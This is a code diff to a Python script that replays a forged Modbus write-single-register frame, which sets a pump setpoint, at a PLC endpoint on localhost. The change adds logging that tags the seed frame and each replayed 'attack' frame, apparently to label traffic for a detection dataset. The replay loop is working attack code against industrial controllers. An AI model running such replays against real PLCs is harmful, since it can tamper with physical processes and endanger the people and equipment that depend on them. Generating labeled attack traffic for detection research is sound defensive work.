@@ -31,7 +31,7 @@ import time
 from pathlib import Path
 
 sys.path.insert(0, str(Path(__file__).resolve().parent))
-from modbus_frames import write_single_register, parse_transaction_id  # noqa: E402
+from modbus_frames import log_packet, write_single_register, parse_transaction_id  # noqa: E402
 
 TAP_HOST = "127.0.0.1"
 TAP_PORT = 5021
@@ -60,6 +60,9 @@ def main() -> None:
     # mint one valid frame and treat its bytes as the captured payload.
     captured = write_single_register(transaction_id=0x2A11,
                                      address=HR_PUMP_SETPOINT, value=55)
+    # The seed is the stand-in for the recorded operator command, not a replay:
+    # it is logged as "seed" so the labeler can keep it out of scoring.
+    log_packet(captured, "seed", "stand-in for the recorded operator write (setpoint 55%)")
     sock.sendall(captured)
     _ = sock.recv(256)  # let the PLC answer so the capture stays well-formed
     print(f"[replay] captured a legitimate write frame, txid="
@@ -67,6 +70,7 @@ def main() -> None:
 
     # Step 2: retransmit it verbatim, out of context, reusing the same txid.
     for i in range(REPLAY_COUNT):
+        log_packet(captured, "attack", f"replay {i + 1}/{REPLAY_COUNT}")
         sock.sendall(captured)
         try:
             sock.recv(256)
